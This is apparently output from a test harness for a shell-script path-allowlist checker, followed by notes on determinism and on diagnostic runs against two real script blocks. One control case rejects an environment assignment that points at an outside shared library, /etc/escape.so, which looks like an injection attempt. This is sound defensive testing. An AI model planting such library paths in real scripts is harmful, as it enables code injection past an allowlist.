PATH value=/safe/dir/file verdict=ALLOW-LEXICAL rule=/safe/dir/file sources=BASE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/f sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c3_empty_only ===
PATHSCOPE shell=c3_empty_only.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c3_empty_only_out ===
PATHSCOPE shell=c3_empty_only_out.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c3_cmdtext_noslash ===
PATHSCOPE shell=c3_cmdtext_noslash.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c4_export_quoted ===
PATHSCOPE shell=c4_export_quoted.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c4_export_quoted_space ===
PATHSCOPE shell=c4_export_quoted_space.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c4_declare_quoted ===
PATHSCOPE shell=c4_declare_quoted.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c4_readonly_quoted ===
PATHSCOPE shell=c4_readonly_quoted.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c4_typeset_quoted ===
PATHSCOPE shell=c4_typeset_quoted.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c4_local_quoted ===
PATHSCOPE shell=c4_local_quoted.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=4:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c4_export_opaque ===
PATHSCOPE shell=c4_export_opaque.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c4_env_quoted_ctl ===
PATHSCOPE shell=c4_env_quoted_ctl.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape.so verdict=FORBID rule=- sources=NONE uses=line=2:env assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c4_export_plain_ctl ===
PATHSCOPE shell=c4_export_plain_ctl.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATH value=/safe/ok.so verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:export assignment
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c3_scalar_ctl ===
PATHSCOPE shell=c3_scalar_ctl.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
```

## Determinism

The last **seven** lines of the harness stdout above run each of `find_exec`,
`assign_prefix`, `c2_list_prefix`, `c3_ws_relative`, `c4_export_quoted`, `RP6-P0` and
`RP7-WPI-RO` twice in memory and compare the complete stdout byte for byte plus the rc.
All seven report `equal=True` with identical digests. Round 2 had three such pairs, round 3
four, round 4 five; round 5 adds one C-3 pair and one C-4 pair so both new grammars are
covered. Determinism is not soundness; it is only the property that the recorded
transcripts can be re-derived — and at round 5 that property was additionally checked
across two deliberately different console/interpreter encodings, which is the defect this
round closed.

## Real-block diagnostic — literally re-runnable

The four real-block cases are the last four sections of `RED_R1.txt` and `GREEN_R5.txt`,
produced by the same single harness command, and they carry their own identity check:

* `=== RP6-P0 with placeholder.constants ===` and `=== RP7-WPI-RO with placeholder.constants ===`
  use the draft §1 value `REMOTE_BASE=/home/gatea/wpi_staging_<ALLOCATE-AT-DISPATCH>`
  exactly as the preregistration carries it. Both STOP at rc 3 before analysis. This is the
  honest Stage-1 result and the repair did not relax it.
* `=== RP6-P0 with real.constants ===` and `=== RP7-WPI-RO with real.constants ===` replace
  **only** that one placeholder with the disclosed non-authoritative static value
  `/home/gatea/wpi_staging_STAGE1_STATIC_BINDING`, for diagnostic depth. This is not
  acceptance evidence.

Both constants files and the machine-form §10.1 allowlist are written literally by the
harness (`real.constants`, `placeholder.constants`, `real.allowlist`); no value has to be
substituted by hand. The block bytes come from `git cat-file blob`, and the harness prints
the git blob id it computed over what it extracted, so the reader can confirm the
extraction is the committed blob.

Rounds 4 and 5 on the same bytes, with `real.constants` (measured this round):

```text
RP6-P0.sh  round 4: resolved_fs_path_count=7 resolved_net_endpoint_count=0
                    unresolved_path_count=3 unresolved_endpoint_count=0
                    coverage_issue_count=200 provenance_issue_count=0 parse_issue_count=0  rc 3
RP6-P0.sh  round 5: byte-identical to round 4 (same counts, same rows, same digest)        rc 3

RP7-WPI-RO round 4: resolved_fs_path_count=7 resolved_net_endpoint_count=0
                    unresolved_path_count=34 unresolved_endpoint_count=0
                    coverage_issue_count=337 provenance_issue_count=0 parse_issue_count=0  rc 3
RP7-WPI-RO round 5: resolved_fs_path_count=7 resolved_net_endpoint_count=0
                    unresolved_path_count=35 unresolved_endpoint_count=0
                    coverage_issue_count=337 provenance_issue_count=0 parse_issue_count=0  rc 3
```

The single round-4 to round-5 addition is named above. No round has ever moved either
block off rc 3, and nothing about these counts converts either block into a PASS; they
remain a lower-bound diagnostic until a fresh T1 audit accepts the tool.
